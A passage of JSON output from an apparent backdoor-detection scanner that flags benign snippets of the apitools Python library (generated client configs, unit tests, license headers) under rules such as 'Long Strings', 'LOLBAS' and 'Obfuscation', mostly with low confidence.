                      "text": "        query_params=['ifMetagenerationMatch', 'ifMetagenerationNotMatch'],\n        relative_path='b/{bucket}/defaultObjectAcl',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsListRequest',\n        response_type_name='ObjectAccessControls',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['ifMetagenerationMatch', 'ifMetagenerationNotMatch'],\n        relative_path='b/{bucket}/defaultObjectAcl',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsListRequest',\n        response_type_name='ObjectAccessControls',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 553,
                  "startColumn": 26,
                  "endLine": 553,
                  "endColumn": 72,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='b/{bucket}/defaultObjectAcl/{entity}',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsGetRequest',\n        response_type_name='ObjectAccessControl',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='b/{bucket}/defaultObjectAcl/{entity}',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsGetRequest',\n        response_type_name='ObjectAccessControl',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='b/{bucket}/defaultObjectAcl/{entity}',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsGetRequest',\n        response_type_name='ObjectAccessControl',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 528,
                  "startColumn": 27,
                  "endLine": 528,
                  "endColumn": 77,
                  "snippet": {
                    "text": "        relative_path='b/{bucket}/defaultObjectAcl/{entity}',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsDeleteRequest',\n        response_type_name='StorageDefaultObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n\n",
                    "rendered": {
                      "text": "        relative_path='b/{bucket}/defaultObjectAcl/{entity}',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsDeleteRequest',\n        response_type_name='StorageDefaultObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n\n",
                      "markdown": "`        relative_path='b/{bucket}/defaultObjectAcl/{entity}',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsDeleteRequest',\n        response_type_name='StorageDefaultObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 527,
                  "startColumn": 26,
                  "endLine": 527,
                  "endColumn": 75,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='b/{bucket}/defaultObjectAcl/{entity}',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsDeleteRequest',\n        response_type_name='StorageDefaultObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='b/{bucket}/defaultObjectAcl/{entity}',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsDeleteRequest',\n        response_type_name='StorageDefaultObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='b/{bucket}/defaultObjectAcl/{entity}',\n        request_field='',\n        request_type_name='StorageDefaultObjectAccessControlsDeleteRequest',\n        response_type_name='StorageDefaultObjectAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 82,
                  "startColumn": 27,
                  "endLine": 82,
                  "endColumn": 70,
                  "snippet": {
                    "text": "        relative_path='b/{bucket}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageBucketAccessControlsDeleteRequest',\n        response_type_name='StorageBucketAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n\n",
                    "rendered": {
                      "text": "        relative_path='b/{bucket}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageBucketAccessControlsDeleteRequest',\n        response_type_name='StorageBucketAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n\n",
                      "markdown": "`        relative_path='b/{bucket}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageBucketAccessControlsDeleteRequest',\n        response_type_name='StorageBucketAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_client.py"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 26,
                  "endLine": 81,
                  "endColumn": 68,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='b/{bucket}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageBucketAccessControlsDeleteRequest',\n        response_type_name='StorageBucketAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='b/{bucket}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageBucketAccessControlsDeleteRequest',\n        response_type_name='StorageBucketAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='b/{bucket}/acl/{entity}',\n        request_field='',\n        request_type_name='StorageBucketAccessControlsDeleteRequest',\n        response_type_name='StorageBucketAccessControlsDeleteResponse',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util_test.py"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 55,
                  "endLine": 92,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        self.assertEquals((1, 2, 3), fn(1, 2, c=3))\n        self.assertEquals((3, 4, None), fn(3, b=4))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 2 positional '\n                                         r'arguments \\(3 given\\)',\n                                         fn, 2, 3, 4)\n\n",
                    "rendered": {
                      "text": "        self.assertEquals((1, 2, 3), fn(1, 2, c=3))\n        self.assertEquals((3, 4, None), fn(3, b=4))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 2 positional '\n                                         r'arguments \\(3 given\\)',\n                                         fn, 2, 3, 4)\n\n",
                      "markdown": "`        self.assertEquals((1, 2, 3), fn(1, 2, c=3))\n        self.assertEquals((3, 4, None), fn(3, b=4))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 2 positional '\n                                         r'arguments \\(3 given\\)',\n                                         fn, 2, 3, 4)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util_test.py"
                },
                "region": {
                  "startLine": 82,
                  "startColumn": 28,
                  "endLine": 82,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        self.assertEquals([2, 2], MyClass().meth(2, kwonly=2))\n        self.assertRaisesWithRegexpMatch(\n            TypeError,\n            r'meth\\(\\) takes at most 2 positional arguments \\(3 given\\)',\n            MyClass().meth, 2, 3)\n\n    def testDefaultDecoration(self):\n",
                    "rendered": {
                      "text": "        self.assertEquals([2, 2], MyClass().meth(2, kwonly=2))\n        self.assertRaisesWithRegexpMatch(\n            TypeError,\n            r'meth\\(\\) takes at most 2 positional arguments \\(3 given\\)',\n            MyClass().meth, 2, 3)\n\n    def testDefaultDecoration(self):\n",
                      "markdown": "`        self.assertEquals([2, 2], MyClass().meth(2, kwonly=2))\n        self.assertRaisesWithRegexpMatch(\n            TypeError,\n            r'meth\\(\\) takes at most 2 positional arguments \\(3 given\\)',\n            MyClass().meth, 2, 3)\n\n    def testDefaultDecoration(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util_test.py"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 55,
                  "endLine": 68,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        self.assertEquals([2, 2, 1], fn(2, 2))\n        self.assertEquals([2, 3, 4], fn(2, 3, kwonly=4))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 2 positional '\n                                         r'arguments \\(3 given\\)',\n                                         fn, 2, 3, 4)\n\n",
                    "rendered": {
                      "text": "        self.assertEquals([2, 2, 1], fn(2, 2))\n        self.assertEquals([2, 3, 4], fn(2, 3, kwonly=4))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 2 positional '\n                                         r'arguments \\(3 given\\)',\n                                         fn, 2, 3, 4)\n\n",
                      "markdown": "`        self.assertEquals([2, 2, 1], fn(2, 2))\n        self.assertEquals([2, 3, 4], fn(2, 3, kwonly=4))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 2 positional '\n                                         r'arguments \\(3 given\\)',\n                                         fn, 2, 3, 4)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util_test.py"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 55,
                  "endLine": 56,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        self.assertEquals([1, 1], fn(1))\n        self.assertEquals([2, 2], fn(2, kwonly=2))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 1 positional '\n                                         r'argument \\(2 given\\)',\n                                         fn, 2, 3)\n\n",
                    "rendered": {
                      "text": "        self.assertEquals([1, 1], fn(1))\n        self.assertEquals([2, 2], fn(2, kwonly=2))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 1 positional '\n                                         r'argument \\(2 given\\)',\n                                         fn, 2, 3)\n\n",
                      "markdown": "`        self.assertEquals([1, 1], fn(1))\n        self.assertEquals([2, 2], fn(2, kwonly=2))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 1 positional '\n                                         r'argument \\(2 given\\)',\n                                         fn, 2, 3)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util_test.py"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 55,
                  "endLine": 45,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        self.assertEquals([1], fn())\n        self.assertEquals([2], fn(kwonly=2))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 0 positional '\n                                         r'arguments \\(1 given\\)',\n                                         fn, 1)\n\n",
                    "rendered": {
                      "text": "        self.assertEquals([1], fn())\n        self.assertEquals([2], fn(kwonly=2))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 0 positional '\n                                         r'arguments \\(1 given\\)',\n                                         fn, 1)\n\n",
                      "markdown": "`        self.assertEquals([1], fn())\n        self.assertEquals([2], fn(kwonly=2))\n        self.assertRaisesWithRegexpMatch(TypeError,\n                                         r'fn\\(\\) takes at most 0 positional '\n                                         r'arguments \\(1 given\\)',\n                                         fn, 1)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util_test.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util_test.py"
                },
                "region": {
                  "startLine": 191,
                  "startColumn": 27,
                  "endLine": 191,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            self.assertEquals(expected, decoded)\n\n    def testDecodeDateTimeWithTruncateTime(self):\n       \"\"\"Test that nanosec time is truncated with truncate_time flag.\"\"\"\n       decoded = util.decode_datetime('2012-09-30T15:31:50.262343123',\n                                      truncate_time=True)\n       expected = datetime.datetime(2012, 9, 30, 15, 31, 50, 262343)\n",
                    "rendered": {
                      "text": "            self.assertEquals(expected, decoded)\n\n    def testDecodeDateTimeWithTruncateTime(self):\n       \"\"\"Test that nanosec time is truncated with truncate_time flag.\"\"\"\n       decoded = util.decode_datetime('2012-09-30T15:31:50.262343123',\n                                      truncate_time=True)\n       expected = datetime.datetime(2012, 9, 30, 15, 31, 50, 262343)\n",
                      "markdown": "`            self.assertEquals(expected, decoded)\n\n    def testDecodeDateTimeWithTruncateTime(self):\n       \"\"\"Test that nanosec time is truncated with truncate_time flag.\"\"\"\n       decoded = util.decode_datetime('2012-09-30T15:31:50.262343123',\n                                      truncate_time=True)\n       expected = datetime.datetime(2012, 9, 30, 15, 31, 50, 262343)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/test_util.py"
                },
                "region": {
                  "startLine": 132,
                  "startColumn": 50,
                  "endLine": 132,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n    A module interface is the set of public objects listed in the\n    module __all__ attribute. Modules that that are considered public\n    should have this interface carefully declared. At all times, the\n    __all__ attribute should have objects intended to be publically\n    used and all other objects in the module should be considered\n    unused.\n",
                    "rendered": {
                      "text": "\n    A module interface is the set of public objects listed in the\n    module __all__ attribute. Modules that that are considered public\n    should have this interface carefully declared. At all times, the\n    __all__ attribute should have objects intended to be publically\n    used and all other objects in the module should be considered\n    unused.\n",
                      "markdown": "`\n    A module interface is the set of public objects listed in the\n    module __all__ attribute. Modules that that are considered public\n    should have this interface carefully declared. At all times, the\n    __all__ attribute should have objects intended to be publically\n    used and all other objects in the module should be considered\n    unused.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/test_util.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/test_util.py"
                },
                "region": {
                  "startLine": 624,
                  "startColumn": 35,
                  "endLine": 624,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEquals(decoded.value, value)\n\n    def testDateTimeWithTimeZone(self):\n        \"\"\"Test DateTimeFields with time zones.\"\"\"\n\n        class MyMessage(messages.Message):\n            value = message_types.DateTimeField(1)\n",
                    "rendered": {
                      "text": "        self.assertEquals(decoded.value, value)\n\n    def testDateTimeWithTimeZone(self):\n        \"\"\"Test DateTimeFields with time zones.\"\"\"\n\n        class MyMessage(messages.Message):\n            value = message_types.DateTimeField(1)\n",
                      "markdown": "`        self.assertEquals(decoded.value, value)\n\n    def testDateTimeWithTimeZone(self):\n        \"\"\"Test DateTimeFields with time zones.\"\"\"\n\n        class MyMessage(messages.Message):\n            value = message_types.DateTimeField(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/test_util.py"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 60,
                  "endLine": 148,
                  "snippet": {
                    "text": "    exception and may be left out of the __all__ definition. The test\n    is done by checking the value of what would otherwise be a public\n    name and not allowing it to be exported if it is an instance of a\n    module. Modules that are explicitly exported are for the time\n    being not permitted.\n\n    To use this test class a module should define a new class that\n    inherits first from ModuleInterfaceTest and then from\n",
                    "rendered": {
                      "text": "    exception and may be left out of the __all__ definition. The test\n    is done by checking the value of what would otherwise be a public\n    name and not allowing it to be exported if it is an instance of a\n    module. Modules that are explicitly exported are for the time\n    being not permitted.\n\n    To use this test class a module should define a new class that\n    inherits first from ModuleInterfaceTest and then from\n",
                      "markdown": "`    exception and may be left out of the __all__ definition. The test\n    is done by checking the value of what would otherwise be a public\n    name and not allowing it to be exported if it is an instance of a\n    module. Modules that are explicitly exported are for the time\n    being not permitted.\n\n    To use this test class a module should define a new class that\n    inherits first from ModuleInterfaceTest and then from\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson_test.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson_test.py"
                },
                "region": {
                  "startLine": 442,
                  "startColumn": 43,
                  "endLine": 442,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        self.assertEquals(MyMessage(an_integer=None), message)\n\n    def testDecodeBadBase64BytesField(self):\n        \"\"\"Test decoding improperly encoded base64 bytes value.\"\"\"\n        self.assertRaisesWithRegexpMatch(\n            messages.DecodeError,\n            'Base64 decoding error',\n",
                    "rendered": {
                      "text": "        self.assertEquals(MyMessage(an_integer=None), message)\n\n    def testDecodeBadBase64BytesField(self):\n        \"\"\"Test decoding improperly encoded base64 bytes value.\"\"\"\n        self.assertRaisesWithRegexpMatch(\n            messages.DecodeError,\n            'Base64 decoding error',\n",
                      "markdown": "`        self.assertEquals(MyMessage(an_integer=None), message)\n\n    def testDecodeBadBase64BytesField(self):\n        \"\"\"Test decoding improperly encoded base64 bytes value.\"\"\"\n        self.assertRaisesWithRegexpMatch(\n            messages.DecodeError,\n            'Base64 decoding error',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson_test.py"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 7,
                  "endLine": 46,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n    class Color(messages.Enum):\n\n        RED = 1\n        GREEN = 2\n        BLUE = 3\n\n",
                    "rendered": {
                      "text": "\n    class Color(messages.Enum):\n\n        RED = 1\n        GREEN = 2\n        BLUE = 3\n\n",
                      "markdown": "`\n    class Color(messages.Enum):\n\n        RED = 1\n        GREEN = 2\n        BLUE = 3\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson_test.py"
                },
                "region": {
                  "startLine": 445,
                  "startColumn": 13,
                  "endLine": 445,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        \"\"\"Test decoding improperly encoded base64 bytes value.\"\"\"\n        self.assertRaisesWithRegexpMatch(\n            messages.DecodeError,\n            'Base64 decoding error',\n            protojson.decode_message,\n            test_util.OptionalMessage,\n            '{\"bytes_value\": \"abcdefghijklmnopq\"}')\n",
                    "rendered": {
                      "text": "        \"\"\"Test decoding improperly encoded base64 bytes value.\"\"\"\n        self.assertRaisesWithRegexpMatch(\n            messages.DecodeError,\n            'Base64 decoding error',\n            protojson.decode_message,\n            test_util.OptionalMessage,\n            '{\"bytes_value\": \"abcdefghijklmnopq\"}')\n",
                      "markdown": "`        \"\"\"Test decoding improperly encoded base64 bytes value.\"\"\"\n        self.assertRaisesWithRegexpMatch(\n            messages.DecodeError,\n            'Base64 decoding error',\n            protojson.decode_message,\n            test_util.OptionalMessage,\n            '{\"bytes_value\": \"abcdefghijklmnopq\"}')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson_test.py"
                },
                "region": {
                  "startLine": 442,
                  "startColumn": 44,
                  "endLine": 442,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        self.assertEquals(MyMessage(an_integer=None), message)\n\n    def testDecodeBadBase64BytesField(self):\n        \"\"\"Test decoding improperly encoded base64 bytes value.\"\"\"\n        self.assertRaisesWithRegexpMatch(\n            messages.DecodeError,\n            'Base64 decoding error',\n",
                    "rendered": {
                      "text": "        self.assertEquals(MyMessage(an_integer=None), message)\n\n    def testDecodeBadBase64BytesField(self):\n        \"\"\"Test decoding improperly encoded base64 bytes value.\"\"\"\n        self.assertRaisesWithRegexpMatch(\n            messages.DecodeError,\n            'Base64 decoding error',\n",
                      "markdown": "`        self.assertEquals(MyMessage(an_integer=None), message)\n\n    def testDecodeBadBase64BytesField(self):\n        \"\"\"Test decoding improperly encoded base64 bytes value.\"\"\"\n        self.assertRaisesWithRegexpMatch(\n            messages.DecodeError,\n            'Base64 decoding error',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
